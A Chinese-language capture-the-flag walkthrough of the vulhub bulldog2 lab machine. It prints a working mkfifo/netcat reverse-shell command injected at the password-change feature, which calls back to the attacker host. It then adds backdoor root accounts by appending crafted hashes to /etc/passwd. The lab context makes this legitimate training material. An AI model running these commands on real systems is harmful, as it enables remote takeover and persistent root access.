【vulhub】bulldog2

🍭0x00 环境搭建

攻击机（kali）：192.168.20.131

靶机（bulldog2）：192.168.20.137

靶机IP设置：在启动界面按E进入代码行然后找到ro这一行将其改为rw 并在后面接上 init=/bin/bash，然后按ctrl+x保存重启，输入passwd root修改密码

重启后root账户登录后输入dhclient配置ip即可

网站指纹信息扫描

目录扫描没发现有用的信息。

🍭0x03 漏洞利用

在修改密码处反弹shell

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.20.131 1111 >/tmp/f
#mkfifo：首先创建了一个管道/tmp/f
#cat：将管道里面的内容输出传递给/bin/sh
#/bin/sh -i 2>&1|nc .... > /tmp/f：sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路

拿到shell

🍭0x04 提权

和之前一样先将简单的Shell转换成为完全交互式的终端

python -c 'import pty;pty.spawn("/bin/bash")'

查看用户信息

可以创建具有root权限的新用户

openssl passwd -1 -salt hack hack123
echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0:root:/root:/bin/bash' >> /etc/passwd

也可以使用perl

perl -le 'print crypt("pass","aa")'      //pass为密码，aa为加密盐
echo 'kkk:aaW3cJZ7OSoQM:0:0:kkk:/root:/bin/bash' >> /etc/passwd    //将其写入passwd文件

添加成功
